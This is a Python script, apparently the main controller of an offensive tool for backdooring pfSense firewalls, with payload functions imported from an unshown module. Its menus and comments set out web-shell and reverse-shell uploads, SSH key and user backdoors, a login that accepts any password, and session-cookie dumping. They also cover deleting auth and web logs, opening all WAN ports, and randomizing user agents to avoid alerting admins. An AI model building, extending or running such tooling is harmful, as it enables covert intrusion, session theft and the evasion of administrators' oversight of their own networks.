#!/usr/bin/python3

## Ideas:
# Fix dates on certain files (touch -r) - DONE
# Dump PHPSESSIDs to hidden file - DONE
# Test PHPSESSIDs to find any potential usable cookies
# Potentially chmod files so unable to change
# SSH needs keys to connect, maybe create a "SSH bootstrap" - DONE
# Fix login so backdoor password as opposed to all passwords - DONE
# try cmds through - Site, SSH, Web Shell, Reverse Shell
# randomize user agents - DONE
# randomize file names
# Split function sets into files - DONE
# reduce libaries
# Make it so SSH keys doesn't alert admins
# find a way to hide logins in shell - DONE


import utils

import requests
import os
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import ipaddress 
from termcolor import colored
from random import randint

class details:
    # Ips
    ip = ""
    iplong = ""
    iphex = ""
    url = ""
    pfsenseIP = ""
    pfippath = ""
    # Creds
    username = ""
    password = ""
    # Website stuff
    csrf = ""
    ids = ""
    idsList = []
    # Output
    cmdOutput = ""
    # Sessions
    session = requests.session()
    # User Agent
    agent = ""


details.session.verify = False

def printMe(text, color, newline):
    if(newline == 1):
        print(colored(text, color))
    else:
        print(colored(text, color), end="")

def printMeNum(number, color):
    text = "(" + str(number) + ") "
    print(colored(text, color), end ="")


def testIDs():
    global url, ids, idsList

    utils.simpleGET("/.ids.php", "", 4)
    split_ids = ids.split("\n")

    for i in split_ids:
        i_bytes = i.encode("ascii")
        
        i_decoded = base64.b64decode(i_bytes).decode("ascii")
        idsList.append(i_decoded)

    print(idsList)

def setUserAgent(details):
    with open('utils/Agents.txt', 'r') as file:
        lines = file.readlines()
    agent_num = randint(0,len(lines))
    details.agent = lines[agent_num].strip()
        

def checkDetails():
    correct = 8 

    if(os.path.exists(".settings")):
        with open('.settings', 'r') as file:
            lines = file.readlines()
        if(len(lines) == correct):
            printMe("Settings File Found", "green", 1)
            return True
        else:
            printMe("Incorrect .settings File", "red", 1)
    else:
        printMe("No Settings File Found", "yellow", 1)
        return False

    folderCheck(details)

def getDetails(details):
    with open('.settings', 'r') as file:
        lines = file.readlines()
  
    for l in lines:
        l_split = l.split(" ")
        if(l_split[0] == "IP-"): details.ip = l_split[1].strip()
        if(l_split[0] == "IPLONG-"): details.iplong = l_split[1].strip()
        if(l_split[0] == "IPHEX-"): details.iphex = l_split[1].strip()
        if(l_split[0] == "URL-"): details.url = l_split[1].strip()
        if(l_split[0] == "PFSENSEIP-"): details.pfsenseIP = l_split[1].strip()
        if(l_split[0] == "PFIPPATH-"): details.pfippath = l_split[1].strip()
        if(l_split[0] == "USERNAME-"): details.username = l_split[1].strip()
        if(l_split[0] == "PASSWORD-"): details.password = l_split[1].strip()

    folderCheck(details)

def saveDetails(details):
    with open('.settings', 'w') as file:
        file.write("IP- " + details.ip + "\n")
        file.write("IPLONG- " + details.iplong + "\n")
        file.write("IPHEX- " + details.iphex + "\n")
        file.write("URL- " + details.url + "\n")
        file.write("PFSENSEIP- " + details.pfsenseIP + "\n")
        file.write("PFIPPATH- " + details.pfippath + "\n")
        file.write("USERNAME- " + details.username + "\n")
        file.write("PASSWORD- " + details.password+ "\n")

    folderCheck(details)

def setDetails(details):

    details.ip = input("Your IP: ")
    details.iplong = '"' + str(int(ipaddress.ip_address(details.ip))) +  '"'
    a = details.ip.split('.')
    details.iphex = "0x" + '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, a))
    details.url = input("Pfsense URL: ")
    details.pfsenseIP = input("Pfsense IP: ")
    details.pfippath = details.pfsenseIP.replace(".", "_")
    details.username = input("Pfsense Username: ")
    details.password = input("Pfsense Password: ")

    saveDetails(details)
    folderCheck(details)

def folderCheck(details):
    if not os.path.exists(details.pfippath):
        print("MAKING FOLDER:",  details.pfippath)
        os.makedirs(details.pfippath)


def sshMenu():
    printMe("Pick Backdoor", "green", 1)

    printMeNum(1, "white")
    printMe("SSH Keys", "cyan", 1)

    printMeNum(2, "white")
    printMe("Add User", "cyan", 1)

    printMeNum(10, "white")
    printMe("Toggle SSH", "cyan", 1)

    printMe("-> ", "magenta", 0)

def mainMenu():
    printMe("Pick One: ", "green", 1)
   
    printMeNum(1, "white")
    printMe("Upload a WebShell", "cyan", 1)

    printMeNum(2, "white")
    printMe("Access WebShell", "cyan", 1)

    printMeNum(3, "white")
    printMe("Upload a Reverse Shell", "cyan", 1)

    printMeNum(4, "white")
    printMe("Reverse Shell Popper", "cyan", 1)

    printMeNum(5, "white")
    printMe("SSH Backdoors", "cyan", 1)

    printMeNum(6, "white")
    printMe("SCP Files", "cyan", 1)

    printMeNum(7, "white")
    printMe("Toggle Proxychains", "cyan", 1)

    printMeNum(8, "white")
    printMe("Execute a CMD via SSH", "cyan", 1)

    printMeNum(9, "white")
    printMe("Execute a CMD via Web", "cyan", 1)

    printMeNum(10, "white")
    printMe("Full Web Backdoor", "cyan", 1)

    printMeNum(11, "white")
    printMe("Remove Auth/Web Logs", "cyan", 1)

    printMeNum(12, "white")
    printMe("Enable all WAN ports", "cyan", 1)

    printMeNum(99, "white")
    printMe("Settings", "cyan", 1)

    printMe("-> ", "magenta", 0)

def menuLevel(leet):
    printMe("Pick One: ", "green", 1)

    printMeNum(1, "white")
    printMe("Skidy", "cyan", 1)

    printMeNum(2, "white")
    printMe("Amatuer", "green", 1)

    printMeNum(3, "white")
    printMe("Pro", "yellow", 1)

    if(leet == 1):
        printMeNum(4, "white")
        printMe("Leet", "red", 1)

    printMe("-> ", "magenta", 0)

def menu():
    global csrf
    mainMenu()
    choice1 = input()

    if(choice1 == "1"):
        menuLevel(0)
        choice2 = input()
        if(choice2 == "1"): utils.skidyWeb(details)
        if(choice2 == "2"): utils.amateurWeb(details)
        if(choice2 == "3"): utils.proWeb(details)
    if(choice1 == "2"):
        menuLevel(1)
        choice2 = input()
        if(choice2 == "0"): utils.initialAccess(details)
        if(choice2 == "1"): utils.skidyAccess(details)
        if(choice2 == "2"): utils.amateurAccess(details)
        if(choice2 == "3"): utils.proAccess(details)
        if(choice2 == "4"): utils.leetAccess(details)
    if(choice1 == "3"):
        menuLevel(0)
        choice2 = input()
        if(choice2 == "1"): utils.skidyRev(details)
        if(choice2 == "2"): utils.amateurRev(details)
        if(choice2 == "3"): utils.proRev(details)
    if(choice1 == "4"):
        menuLevel(1)
        level = input()
        utils.Popper(details, level)

    if(choice1 == "5"):
        sshMenu()
        choice2 = input()
        if(choice2 == "1"): utils.addSSHKey(details)
        if(choice2 == "2"): utils.addUser(details)
        if(choice2 == "10"): utils.toggleSSH(details)
    if(choice1 == "6"):
        printMe("Upload File (0)", "white", 1)
        printMe("Download File (1)", "white", 1)
        printMe("-> ", "magenta", 0)
        direction = input()

        user = input("Username: ")

        if(direction == "0"):
            filename = input("File to upload: ")
            path = input("Path on pfsense to upload to: ")

            utils.scpSSH(details, user, direction, filename, path)

        if(direction == "1"):
            path = input("Full path of file to download: ")
            filename = input("Output file name: ")

            utils.scpSSH(details, user, direction, filename, path)
    if(choice1 == "7"):
        utils.toggleChains(details)

    if(choice1 == "8"):
        user = input("Username: ")
        printMe("CMD: ", "magenta", 0)
        cmd = input()
        utils.cmdSSH(details, user, cmd)
    if(choice1 == "9"):
        utils.simpleGET(details, "/", "", 0)
        utils.loginPOST(details)
        printMe("CMD: ", "magenta", 0)
        cmd = input()
        utils.cmdGET(details, cmd)
    if(choice1 == "10"):
        printMe("##### Leet Backdoor #####", "white", 1)
        printMe("This will create:\n-Login that will accept any password with valid username\n-Disable Auth messages in pfsense shell\n-Web shell on root page\n-Reverse shell on root page\n-PHPSESSIDs put in .ids.php\n", "cyan", 1)
        printMe("This will require a restart of the firewall, is that ok?", "red", 1)
        printMeNum(1, "white")
        printMe("Yes\n", "red", 0)
        printMeNum(2, "white")
        printMe("No\n", "red", 0)
        printMe("-> ", "magenta", 0)
        choice2 = input()
        if(choice2 == "1"): utils.leetUpload(details)
        if(choice2 == "2"): print("Safe one fam")
    if(choice1 == "11"): utils.removeLogs(details)
    if(choice1 == "12"): utils.enableAllWan(details)
    if(choice1 == "99"): setDetails(details)

    menu()

def main():
    setUserAgent(details)
    # Check for .settings file that contains class information
    if(checkDetails()):
        getDetails(details)
    else:
        setDetails(details)


    menu()
if __name__ == "__main__":
    main()

